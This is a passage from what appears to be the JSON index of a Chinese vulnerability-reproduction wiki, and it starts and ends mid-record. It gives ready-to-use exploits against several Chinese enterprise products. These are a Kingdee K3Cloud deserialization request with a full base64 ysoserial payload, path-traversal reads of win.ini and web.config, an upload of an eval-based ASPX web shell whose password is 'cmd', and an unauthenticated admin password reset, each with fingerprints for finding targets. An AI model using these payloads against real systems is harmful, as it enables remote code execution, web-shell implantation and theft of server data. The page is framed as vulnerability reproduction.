","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 需要 ysoserial 工具构造恶意序列化数据。 poc POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1 Host: your-ip Content-Type: text/json {\"ap0\":\"asdas\",\"format\":\"3\"} .\\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c \"a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll\" exp POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1 Host: your-ip Content-Type: text/json cmd: dir {\"ap0\":\"AAEAAAD/AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNvbGxlY3Rp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","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞修复 目前官方已发布安全补丁，受影响用户可以联系官方获取补丁。https://vip.kingdee.com/knowledge/specialDetail/352491453127123200?category=352491970117034240\u0026id=388994085535220992\u0026productLineId=1 缓解方案: 对于低于 PT123230 [6.2.1012.4]版本的金蝶云星空，请禁止把金蝶云星空管理中心发布到公网访问，并使用防火墙设置能访问管理中心的 IP 白名单。如有需要发布到外网，或内网需要访问管理中心，可设置白名单进行控制，详情可参考：https://vip.kingdee.com/article/248777993676668672?productLineId=1\u0026isKnowledge=2 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437 ","date":"0001-01-01","objectID":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/:0:0","tags":null,"title":"","uri":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/"},{"categories":null,"content":"漏洞描述 银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息 ","date":"0001-01-01","objectID":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/:1:0","tags":null,"title":"","uri":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/"},{"categories":null,"content":"漏洞影响 银澎云计算 好视通视频会议系统 ","date":"0001-01-01","objectID":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/:2:0","tags":null,"title":"","uri":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/"},{"categories":null,"content":"网络测绘 app=\"Hanming-Video-Conferencing\" ","date":"0001-01-01","objectID":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/:3:0","tags":null,"title":"","uri":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞Url为 https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini ","date":"0001-01-01","objectID":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/:4:0","tags":null,"title":"","uri":"/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97-%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-cnvd-2020-62437/"},{"categories":null,"content":"银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 银达汇智 智慧综合管理平台 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"汇智信息\" \u0026\u0026 title=\"智慧综合管理平台登入\" ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-filedownload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 银达汇智 智慧综合管理平台 ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"汇智信息\" \u0026\u0026 title==\"智慧综合管理平台登入\" ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 文件上传请求包 POST /Module/FileUpPage/FileUp.aspx?orgid=1\u0026type=NNewsContent HTTP/1.1 Host: Accept-Encoding: identity Content-Length: 337 Accept-Language: zh-CN,zh;q=0.8 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Connection: keep-alive Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9 --62907949903a4c499178971c9dab4ad9 Content-Disposition: form-data; name=\"Filedata\"; filename=\"abc.aspx\" Content-Type: image/jpeg \u003c%@ Page Language=\"Jscript\"%\u003e\u003c%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile(\"abc\", \"MD5\").ToLower());eval(Request.Item[\"cmd\"],\"unsafe\");%\u003e --62907949903a4c499178971c9dab4ad9-- 响应包会返回文件名，上传的目录为 /imgnews/imgcontent/1/xxxxxxxxxx.aspx 出现如图成功上传木马，密码为 cmd ","date":"0001-01-01","objectID":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-fileup.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐起云 resetPwd 登陆绕过漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐起云是一款企业私有云，旨在帮助企业建立私有云存储和管理系统，帮助企业实现集中管理文档、强化数据安全、打造信息互通、数据驱动的协同办公环境。提升工作效率的同时，使数据真正为企业掌控，全程不改变用户操作习惯，是全新一代企业云盘的代表。锐起云存在前台未授权修改密码登陆后台漏洞，攻击者可以通过访问特定接口重置管理员密码。 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐起云 v3.6 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"锐起云\" ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 poc，将密码重置为111111 /dwr/role/resetPwd ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-resetpwd-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐起云 xiazai 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐起云 xiazai 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件。 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐起云 v3.6 ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"锐起云\" ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /dwr/hret/fileTree?filePath=../ /dwr/srecy/xiazai?filePath=../../../../../../../../../../../Windows/win.ini /dwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini ","date":"0001-01-01","objectID":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"阿尔法科技 虚拟仿真实验室 未授权访问漏洞 